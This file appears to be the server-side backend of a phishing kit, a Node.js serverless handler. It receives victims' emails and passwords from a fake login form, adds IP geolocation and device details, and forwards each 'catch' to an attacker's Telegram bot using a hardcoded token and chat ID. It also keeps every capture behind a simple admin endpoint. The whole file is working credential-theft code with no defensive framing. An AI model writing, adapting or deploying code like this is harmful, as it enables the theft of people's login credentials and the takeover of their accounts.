const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
const CHAT_ID = '7607355489';
const ADMIN_KEY = 'lo-secret-2026';  // change this

// In-memory store (resets on deploy, use Vercel KV for persistence)
const captures = [];
const seenEmails = new Set();

async function getGeo(ip) {
    try {
        const cleanIp = ip.split(',')[0].trim();
        if (cleanIp === '127.0.0.1' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.')) {
            return { country: 'Local/Private', city: 'N/A', isp: 'N/A', query: cleanIp };
        }
        const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,query`);
        const data = await res.json();
        if (data.status === 'success') return data;
        throw new Error('Geo failed');
    } catch (err) {
        return { country: 'Unknown', city: 'Unknown', isp: 'Unknown', query: ip };
    }
}

function parseUA(ua) {
    const os = ua.match(/(Windows|Mac|Linux|Android|iOS)/i)?.[0] || 'Unknown';
    const browser = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)/i)?.[0] || 'Unknown';
    const device = /Mobile|Android|iPhone/.test(ua) ? 'Mobile' : 'Desktop';
    return { os, browser, device };
}

async function sendTelegram(text) {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.description);
    return data;
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // === ADMIN PANEL ===
    if (req.method === 'GET' && req.url.startsWith('/api/admin')) {
        const key = new URL(req.url, `http://${req.headers.host}`).searchParams.get('key');
        if (key !== ADMIN_KEY) return res.status(403).json({ error: 'Invalid key' });
        return res.status(200).json({
            total: captures.length,
            uniqueEmails: seenEmails.size,
            captures: captures
        });
    }

    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const data = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    const geo = await getGeo(clientIp);
    const ua = parseUA(data.userAgent || '');

    // Duplicate detection
    const fingerprint = `${data.email}:${data.password}`;
    const isDuplicate = seenEmails.has(data.email);
    if (!isDuplicate) seenEmails.add(data.email);

    const capture = {
        ...data,
        ip: geo.query,
        country: geo.country,
        city: geo.city,
        isp: geo.isp,
        os: ua.os,
        browser: ua.browser,
        device: ua.device,
        receivedAt: new Date().toISOString(),
        isDuplicate
    };

    captures.push(capture);

    const flag = isDuplicate ? '⚠️ DUPLICATE' : '🎣 NEW CATCH';
    const text = 
`<b>${flag}</b>

<b>📧 Credentials</b>
Email: <code>${data.email}</code>
Pass: <code>${data.password}</code>
Attempt: #${data.attemptNumber}

<b>🌍 Location</b>
IP: <code>${geo.query}</code>
Country: ${geo.country}
City: ${geo.city}
ISP: ${geo.isp}

<b>💻 Device</b>
OS: ${ua.os}
Browser: ${ua.browser}
Device: ${ua.device}
Screen: ${data.screen}
Lang: ${data.language}

<b>⏰ Time</b>
${new Date(data.timestamp).toLocaleString()}`;

    try {
        await sendTelegram(text);
        return res.status(200).json({ ok: true, duplicate: isDuplicate });
    } catch (err) {
        console.error('Telegram failed:', err.message);
        return res.status(200).json({ ok: false, error: err.message, stored: true });
    }
};
